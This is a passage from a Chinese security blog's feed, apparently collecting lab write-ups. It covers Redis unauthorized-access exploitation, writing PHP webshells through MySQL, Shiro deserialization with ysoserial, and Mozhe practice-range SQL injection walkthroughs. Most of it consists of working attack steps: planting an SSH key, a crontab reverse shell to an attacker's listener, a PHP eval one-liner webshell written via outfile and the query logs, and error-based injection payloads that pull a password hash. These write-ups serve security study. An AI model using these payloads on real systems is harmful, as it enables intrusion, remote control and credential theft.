alt="在这里插入图片描述"></p><p><strong>利用方式二：写入SSH公钥实现SSH登录</strong><br>将攻击机本机的公钥作为value，然后通过修改redis的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在靶机2的/root/.ssh下生一个授权的key，从而通过ssh登录靶机2。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa <span class="comment">#生成ssh公钥和私钥,默认密码为空</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20e1056957864553a16b1efd5814267a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/947e26f0a96c4c779af4658604df15f8.png" alt="在这里插入图片描述"></p><p>将生成的公钥保存到ssh.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; ssh.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa0c918525c54c3f9607a4b20548e324.png" alt="在这里插入图片描述"><br>将保存的公钥ssh.txt写入靶机2 redis的key值ssh中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/.ssh/ssh.txt | redis-cli -h 靶机2 -x <span class="built_in">set</span> ssh</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/f55a4e2ef0a349adbd682cca94433854.png" alt="在这里插入图片描述"></p><p>远程登录靶机2的redis服务，更改redis备份路径为ssh公钥存放目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d6a29e85e7804d6192eec815d17c73ac.png" alt="在这里插入图片描述"></p><p>设置上传公钥的备份文件名字为<code>authorized_keys</code>,保存上传<br><img src="https://img-blog.csdnimg.cn/39146a0f6f19408fb1fbe034113f9db3.png" alt="在这里插入图片描述"><br>攻击机使用ssh免密登录靶机2<br><img src="https://img-blog.csdnimg.cn/423ff5f4b3ab410a82c7a6dbad4348ab.png" alt="在这里插入图片描述"></p><p>成功登录靶机2<br><img src="https://img-blog.csdnimg.cn/e59317f4123d47f0916bceceab38c166.png" alt="在这里插入图片描述"></p><p><strong>利用方式三：crontab定时任务，反弹shell</strong><br>攻击机监听9999端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 端口</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/814ecd57633b4f3b8ac28290b13b2dd2.png" alt="在这里插入图片描述"></p><p>远程登录redis，写入定时任务，一分钟后执行bash反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">test</span> <span class="string">&quot;\n\n*/1 * *  * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机/监听端口 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="built_in">test</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8224058e9d40426db4d609b5924ebff2.png" alt="在这里插入图片描述"></p><p>反弹shell成功<br><img src="https://img-blog.csdnimg.cn/2fd620c007a64ee4b7a2e6a97a8434be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>利用方式四：执行lua脚本</strong><br>Redis在2.6推出了脚本功能，允许开发者使用lua语言编写脚本传到Redis中<br>执行。暂时还没找到怎么利用lua执行系统命令。</p><p>编写lua脚本test.lua输出字符hello,world!</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> a = <span class="string">&quot;hello,world!&quot;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3554ae78db6a4fb793899e17f0416f02.png" alt="在这里插入图片描述"><br>redis-cli –eval test.lua -h 靶机2<br><img src="https://img-blog.csdnimg.cn/175b98fe97a34b1a86f966a6f3517de8.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;redis未授权访问的利用方式&quot;&gt;&lt;a href=&quot;#redis未授权访问的利用方式&quot; class=&quot;headerlink&quot; title=&quot;redis未授权访问的利用方式&quot;&gt;&lt;/a&gt;redis未授权访问的利用方式&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;漏洞原理：&lt;/str</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="未授权访问漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="redis未授权访问" scheme="https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    <category term="未授权访问漏洞" scheme="https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Mysql写shell的几种方式</title>
    <link href="https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</id>
    <published>2021-07-06T03:04:00.000Z</published>
    <updated>2021-12-08T08:19:13.390Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Mysql写shell的几种方式"><a href="#Mysql写shell的几种方式" class="headerlink" title="Mysql写shell的几种方式"></a><strong>Mysql写shell的几种方式</strong></h2><p>当我们拿到数据库权限时，可通过数据库管理工具写入shell到目标服务器上，利用shell控制目标服务器。</p><p><strong>复现环境：</strong><br>phpstudy_pro 8.1.0.6<br>mysql 5.7.26 root权限<br>           网站绝对路径为D:\phpstudy_pro\WWW</p><p>   <strong>利用方式：</strong></p><ol><li>通过<code>outfile</code>写入shell<br>尝试通过outfile写入文件 </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错[<span class="type">Code</span>: <span class="number">1290</span>, <span class="type">SQL</span> <span class="type">State</span>: <span class="type">HY000</span>]The MySQL server is running with the –secure<span class="operator">-file</span><span class="literal">-priv</span> option so it cannot execute this statement</span><br></pre></td></tr></table></figure><p> 百度之后找到原因：mysql 5.6.34版本以后 <code>secure_file_priv</code>的值默认为NULL，限制无法导入和导出文件</p><p>   解决办法：在my.ini配置文件[mysqld]下添加<code>secure_file_priv =&quot;&quot;</code>使其默认为空<br>   <img src="https://img-blog.csdnimg.cn/70497d772f4c4ba2b573352f25dae7a8.png" alt="在这里插入图片描述"></p><p>   新建查询select</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span> into outfile</span><br><span class="line"><span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;，成功写入shell.php文件  </span><br></pre></td></tr></table></figure><p>   <img src="https://img-blog.csdnimg.cn/f79f35a5ba554bd094273ff47937fd24.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   蚁剑连接<code>http://localhost:122/shell.php</code>成功<br> <img src="https://img-blog.csdnimg.cn/9ef8af7928304a1fa0bae9f9f23c8e6a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>向表插入shell并查询导出<br>将一句话木马作为数据插入test1表username字段中 </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into`test1`(`username`) values (<span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>   <img src="https://img-blog.csdnimg.cn/91bac466134a4bb3acd8333fa95afeb4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0a7e3aab22b44c73b0eda03f49cedc6a.png" alt="在这里插入图片描述"></p><p>   查询该数据并导出到shell.php </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> username from test1 into outfile <span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/da32a5781ab64cfaa087b6d3ee6d3d59.png" alt="在这里插入图片描述"></p><p>   蚁剑连接<code>http://localhost:122/shell.php</code>成功<br>   <img src="https://img-blog.csdnimg.cn/e201c8e019154fc698254e00c89fd436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li>开启全局日志写入shell<br>首先查看全局日志是否开启 </li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%general%&#x27;</span>;  </span><br></pre></td></tr></table></figure><p>  如图所示<code>general_log=OFF</code>全局日志未开启<br><img src="https://img-blog.csdnimg.cn/44c04cc005934a129868ddd10b8c2e3f.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启全局日志 </span><br><span class="line"><span class="built_in">set</span> global general_log = on; </span><br><span class="line">将全局日志路径设置为shell文件路径 </span><br><span class="line"><span class="built_in">set</span> global general_log_file = <span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;  </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3c4264123e154720b26fab468da00c9a.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新建查询<span class="built_in">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>   mysql会将执行的语句记录到全局日志，从而将shell写入网站目录</p><p>   <img src="https://img-blog.csdnimg.cn/400cc6ceb41546b6a38f222c7cc776fb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   蚁剑连接成功</p><ol start="4"><li>慢查询日志写入shell<br>由于在mysql&gt;5.6.34中，<code>secure_file_priv</code>会阻拦我们使用outfile写入文件，没有服务器权限无法修改my.ini配置文件，可以利用慢查询日志写入shell，原理和利用全局日志差不多。首先一样查看慢查询日志是否开启 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%slow_query_log%&#x27;</span>;  </span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/0c157e9b78d94f558fa2810fb9b612c6.png" alt="在这里插入图片描述"></li></ol><p>   开启慢查询日志并修改日志文件的绝对路径  </p><p>   <img src="https://img-blog.csdnimg.cn/c39b3347745f4fab952e9f2d5e227e03.png" alt="在这里插入图片描述"></p><p>   使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中 </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询mysql系统时间 show global variables like <span class="string">&#x27;%long_query_time%&#x27;</span>;  </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/373a27b72f2842daa1068ddf60dba949.png" alt="在这里插入图片描述"></p><p>   向日志中写入shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> or <span class="built_in">sleep</span>(<span class="number">11</span>);设置查询时间为<span class="number">11</span>s</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/73414b3a6c5446c79613d1ec565f66be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   执行成功<br>     <img src="https://img-blog.csdnimg.cn/7aa6d66c6eff48df85d9b006f8617c02.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   蚁剑连接成功</p><ol start="5"><li>phpMyAdmin文件包含漏洞<br>CVE-2018-19968<br>CVE-2018-12613<br>CVE-2016-5734<br>CVE-2014-8959</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Mysql写shell的几种方式&quot;&gt;&lt;a href=&quot;#Mysql写shell的几种方式&quot; class=&quot;headerlink&quot; title=&quot;Mysql写shell的几种方式&quot;&gt;&lt;/a&gt;&lt;strong&gt;Mysql写shell的几种方式&lt;/strong&gt;&lt;/h2&gt;</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="getshell" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"/>
    
    
    <category term="sql注入" scheme="https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="getshell" scheme="https://redredredfish.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>shiro反序列化的初级理解</title>
    <link href="https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-07-06T02:37:00.000Z</published>
    <updated>2021-12-06T03:09:26.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shiro反序列化原理"><a href="#shiro反序列化原理" class="headerlink" title="shiro反序列化原理"></a>shiro反序列化原理</h2><p><strong>rememberMe功能：</strong><br>shiro框架提供了rememberMe功能，这个功能大概是用户登录成功后会生成一个凭证组，shiro将它经过序列化-&gt;AES加密-&gt;Base64加密得到一串数据流传回给cookie，下次登录时，shiro通过Base64解码-&gt;AES解密-&gt;反序列化验证cookie中的rememberMe包含的凭证组是否正确，从而实现“下次登录记住我”的功能。</p><p>  <strong>漏洞原理：</strong><br>造成shiro反序列化漏洞的关键点，一个是Shiro&lt;1.2.4中，AES-CBC加解密时key默认为硬编码，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据；另一个点是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。</p><p>  <strong>漏洞利用：</strong></p><ol><li>首先需要获取正确的key值，利用shiro接收错误rememberMe会抛出异常返回Set-Cookie的特性，可以通过爆破，直到响应头中不包含Set-Cookie，说明key成功匹配。</li><li>接着需要对恶意数据进行序列化，shiro序列化对象只有继承PrincipalCollection时，类型转换才正常，不然会抛出异常，这里可以借助ysoserial生成序列化数据：<br>利用ysoserial中的JRMP监听模块进行反弹shell，需使用Java Runtime 配合 bash 编码 java -cp</li><li>ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 监听端口<br>CommonsCollections4 ‘bash编码’ 利用ysoserial生成.ser文件 java -jar<br>ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 “命令” &gt; x.ser</li><li>然后进行AES加密、Base64加密，伪造cookie，执行命令</li></ol><h2 id="如何判断一个网站是否使用了shiro框架"><a href="#如何判断一个网站是否使用了shiro框架" class="headerlink" title="如何判断一个网站是否使用了shiro框架"></a>如何判断一个网站是否使用了shiro框架</h2><p>在请求包中的cookie字段添加rememberMe=xxx,查看响应头中是否包含rememberMe=deleteMe值<br>例如：<br><img src="https://img-blog.csdnimg.cn/5a2a09b4e61442c199210cddbfcda914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;shiro反序列化原理&quot;&gt;&lt;a href=&quot;#shiro反序列化原理&quot; class=&quot;headerlink&quot; title=&quot;shiro反序列化原理&quot;&gt;&lt;/a&gt;shiro反序列化原理&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;rememberMe功能：&lt;/strong&gt;&lt;br&gt;</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="shiro反序列化" scheme="https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>墨者-SQL注入漏洞测试(报错盲注) 题解</title>
    <link href="https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/"/>
    <id>https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/</id>
    <published>2021-06-21T08:20:00.000Z</published>
    <updated>2021-12-08T08:26:44.798Z</updated>
    
    <content type="html"><![CDATA[<p>靶场地址：<a href="https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe</a></p><p>依旧是mysql、无防护</p><p>①依旧是公告界面</p><p>url:<a href="http://219.153.49.228:44679/new_list.php?id=1">http://219.153.49.228:44679/new_list.php?id=1</a></p><p><code>1&#39;,1&#39; and &#39;1&#39;=&#39;1&#39; -- q,1&#39; and &#39;1&#39;=&#39;2&#39; -- q</code>判断存在字符型注入</p><p>数据库类型为MariaDB</p><p>②order by 判断字段数为4，union select无回显</p><p>③尝试报错注入，利用函数updatexml()</p><p>updatexml参数(目标xml内容,xml文档路径,更新的内容)</p><p>当文档路径包含字符<code>~</code>,会判断不合法，输出字符<code>~</code>报错</p><p>利用concat函数将子查询语句与字符~拼接</p><p>例如：<code>concat(0x7e,(select user()))</code></p><p>会将查询结果拼接~报错输出</p><p>所以尝试</p><p><code>id=1&#39; and updatexml(1,concat(0x7e,(select user())),1) -- q</code><br><img src="https://img-blog.csdnimg.cn/fd2e6ce1b95843f1ba7350621e7bd1de.png" alt="在这里插入图片描述"><br>判断存在报错注入</p><p>④接下来还是联合注入那一套，替换子查询语句即可</p><p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),1) -- q</code></p><p>爆出库名information_schema,mysql,perfor</p><p>查询perfor库是空的</p><p>database()查询出当前数据库为<strong>stormgroup</strong>，居然不在schema_name里</p><p>爆出表名member,notice</p><p>表member爆出字段name,password,status</p><p>⑤分别查询字段值</p><p><code>id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(字段) from member)),1) -- q</code></p><p>name字段：mozhe,mozhe</p><p>status字段：0,1</p><p>查询password字段时，根据另外两个字段可知有两条数据，因为报错长度最多为32位，字符~占了1位，剩下31位不够输出第一个32位的MD5密码，而且第一条数据status字段值为0，大概率用不了。</p><p>直接查询第二条数据</p><p><code>id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from member where status=&#39;1&#39;)),1) -- q</code><br><img src="https://img-blog.csdnimg.cn/7399583641f94eee805ebb3f2d6a0c21.png" alt="在这里插入图片描述"><br>得到~76e59b744c5db295a5f0b66f2e9a192</p><p>依旧少了一位，利用函数substr(字符串，32，1)输出第32位字符</p><p><code>id=11111111&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),32,1) from member where status=1)),1) -- q</code></p><p>得到~e</p><p>拼一拼得到76e59b744c5db295a5f0b66f2e9a192e</p><p>解密得到945748</p><p>mozhe/945748登录得到key</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;靶场地址：&lt;a href=&quot;https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe&quot;&gt;https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3W</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysql注入" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="靶场" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sql注入" scheme="https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysql注入" scheme="https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="报错注入" scheme="https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解</title>
    <link href="https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/"/>
    <id>https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/</id>
    <published>2021-06-20T08:14:00.000Z</published>
    <updated>2021-12-08T08:26:34.683Z</updated>
    
    <content type="html"><![CDATA[<p>靶场地址：<a href="https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe</a></p><p>题解：<br>①启动靶场</p><p>url：<a href="http://219.153.49.228:43157/">http://219.153.49.228:43157/</a></p><p>是一个登录界面，显然需要登录获得key，一开始使用万能密码、抓包都没找到注入点，结果在这个滚动的公告页面</p><p>url:<a href="http://219.153.49.228:43157/new_list.php?id=tingjigonggao">http://219.153.49.228:43157/new_list.php?id=tingjigonggao</a><br><img src="https://img-blog.csdnimg.cn/51f8edc0bf6448e5a5e95f742b23f456.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>②进入页面，url中有id=tingjigonggao，显示是get的字符型参数<br>   试一下<code>id=tingjigonggao&#39;</code>，报错<br>  <img src="https://img-blog.csdnimg.cn/7adce1bac5ed4ee49c0dc0ef15b9bf5c.png" alt="在这里插入图片描述"><br>  试一下<code>id=tingjigonggao&#39; and &#39;1&#39;=&#39;1&#39; -- q</code>,页面正常<br>  <img src="https://img-blog.csdnimg.cn/184dd5f313fd4ae18d082d41f50e78a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>  试一下<code>id=tingjigonggao&#39; and &#39;1&#39;=&#39;2&#39; -- q</code>,页面不正常<br>  <img src="https://img-blog.csdnimg.cn/975d5837a2df4302ba477de8a3624ff5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>  判断存在字符型注入。</p><p>③判断字段数</p><p><code>id=aaa&#39; order by 5 -- q</code>，报错</p><p><code>id=aaa&#39; order by 4 -- q</code>，没数据，正常</p><p>判断字段数为4。</p><p>④判断回显点</p><p><code>id=aaa&#39; union select 1,2,3,4 -- q</code><br><img src="https://img-blog.csdnimg.cn/20e02e084f794627b1deeb1aa3be175b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>2,3参数处回显。</p><p>⑤参数替换<code>version()</code>查看版本</p><p><code>id=aaa&#39; union select 1,2,version(),4 -- q</code><br><img src="https://img-blog.csdnimg.cn/a578cbaf0d2449e3a10c937646096dc9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>MariaDB-10.2.15&gt;mysql5.0,放心用information_schema库。</p><p>⑥查询所有库名</p><p><code>id=aaa&#39; union select 1,2,group_concat(schema_name),4 from information_schema.schemata -- q</code><br><img src="https://img-blog.csdnimg.cn/c91d51f830314f30a92a8057600b6184.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>获得库名information_schema,mozhe_discuz_stormgroup,mysql,performance_schema,test</p><p>⑦查询mozhe_discuz_stormgroup库中的表<br><code>id=aaa&#39; union select 1,2,group_concat(table_name),4 from 